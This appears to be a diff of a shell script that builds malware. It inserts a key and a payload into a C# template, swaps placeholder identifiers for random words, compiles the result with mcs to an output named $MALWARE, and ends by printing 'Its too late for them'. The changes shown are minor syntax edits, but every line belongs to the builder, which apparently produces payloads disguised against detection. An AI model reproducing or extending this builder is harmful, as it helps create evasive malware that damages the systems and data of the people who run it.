@@ -11,7 +11,7 @@ cp shell.txt shell2.txt
 keys=$(cat "shell2.txt")
 head -n 1 shell.txt | cut -d $'\n' -f 1 > shell3.txt
 keysnow=$(cat shell3.txt)
-sed -i "s/KEYVAL/$keysnow/g" test.cs
+sed -i "s/KEYVAL/$keysnow/g" -i test.cs
 sleep 2
 head -n 2 shell.txt | cut -d $'\n' -f 2 > shell4.txt
 perl -pe 's/PAYVAL/`cat shell4.txt`/ge' -i test.cs
@@ -140,6 +140,6 @@ Random2=$(cat slovo.txt)
 sed -i "s/Slucajno38/$Random2/g" test.cs 
 rm -rf *.txt
 sleep 2
-mcs -out:$MALWARE test.cs>/dev/null 2>&1
+mcs -out:$MALWARE test.cs >/dev/null 2>&1
 rm -rf $MALWARE.mdb
 echo "Its too late for them"
